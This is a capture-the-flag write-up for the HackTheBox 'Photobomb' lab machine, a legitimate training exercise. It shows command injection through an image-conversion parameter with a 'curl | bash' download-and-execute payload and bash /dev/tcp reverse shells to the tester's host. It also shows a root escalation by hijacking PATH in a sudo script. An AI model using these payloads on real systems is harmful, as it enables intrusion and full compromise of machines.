# Photobomb - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Photobomb.JPG](images/Photobomb.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, and `80`.

***User***: Locate the credentials for the `/printer` endpoint in the HTML source code. Utilize command injection on the image download request's `filetype` argument to obtain a reverse shell.

***Root***: Executing the command `sudo -l` reveals that the script `/opt/cleanup.sh` can be run as the `root` user and the environment variables can be altered. Upon examining the script, it is observed that the `find` command is not executed with its full path. Taking advantage of this, we craft our own find command and gain a reverse shell as the `root` user.

![pwn.JPG](images/pwn.JPG)


## Photobomb Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar@parrot]─[/hackthebox/Photobomb]
└──╼ $ nmap -sV -sC -oA nmap/Photobomb 10.10.11.182
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-26 23:49 IDT
Nmap scan report for 10.10.11.182
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

After inspecting the HTML source code, we discovered a JavaScript file located at http://photobomb.htb/photobomb.js.:
```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

The link http://photobomb.htb/printer is the same as the one found on the homepage.

Upon accessing the link http://pH0t0:b0Mb!@photobomb.htb/printer, the following was obtained::

![printer.JPG](images/printer.JPG)

By intercepting the download request using Burp, the following was obtained:
```HTTP
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://photobomb.htb
DNT: 
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

Remote Code Execution (RCE) can be achieved through a command injection technique on the `filetype` argument as follows:
```HTTP
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://photobomb.htb
DNT: 
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+http://10.10.14.14:8000/rev.sh&dimensions=3000x2000
```

The following request was received by our web server:
```console
┌─[evyatar@parrot]─[/hackthebox/Photobomb]
└──╼ $ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.182 - - [28/Oct/2022 00:37:31] "GET /rev.sh HTTP/1.1" 200 -
```

`rev.sh` contains:
```console
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1
```

Now, we simply need to execute it using bash as follows:
```HTTP
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://photobomb.htb
DNT: 
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+http://10.10.14.14:8000/rev.sh+|+bash&dimensions=3000x2000
```

Upon sending the request, a reverse shell is obtained:
```console
┌─[evyatar@parrot]─[/hackthebox/Photobomb]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.15] from photobomb.htb [10.10.11.182] 49870
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$
```

To gain a better understanding of the command injection, let's examine the relevant section in the `server.rb` file:
```console
wizard@photobomb:~/photobomb$ ls
ls
log
photobomb.sh
public
resized_images
server.rb
source_images
wizard@photobomb:~/photobomb$ cat server.rb
cat server.rb
# server.rb
require 'sinatra'

set :public_folder, 'public'
...

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
...
```

The system(command) function is observed, which executes the injected command.

Now, let's retrieve the user flag:
```console
wizard@photobomb:~/photobomb$ cd /home/wizard
cd /home/wizard
wizard@photobomb:~$ cat user.txt
cat user.txt
edf1162588052faacd361e39e20da899
```
### Root

By executing the command `sudo -l`, the following was displayed:
```console
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

This indicates that we have the ability to alter the environment variables for the script, which can be run as the root user.

Let's take a closer look at the script:
```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

The `find` command is seen, which is not executed with its full path.

We can create our own `find` and add the path to our `find` to the `PATH` environment variable.

```console
wizard@photobomb:~/photobomb$ cat find
cat find
bash -i >& /dev/tcp/10.10.14.14/4343 0>&1
```

By executing the script as follows:
```console
wizard@photobomb:~/photobomb$ sudo PATH=/home/wizard/photobomb:$PATH /opt/cleanup.sh
<o PATH=/home/wizard/photobomb:$PATH /opt/cleanup.sh
```

A reverse shell as the `root` user is obtained:
```console
┌─[evyatar@parrot]─[/hackthebox/Photobomb]
└──╼ $ nc -lvp 4343
listening on [any] 4343 ...
connect to [10.10.14.14] from photobomb.htb [10.10.11.182] 38440
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt
1395c5398713add93cf2091ac8c5ba4f
```

And we get the root flag ```1395c5398713add93cf2091ac8c5ba4f```.
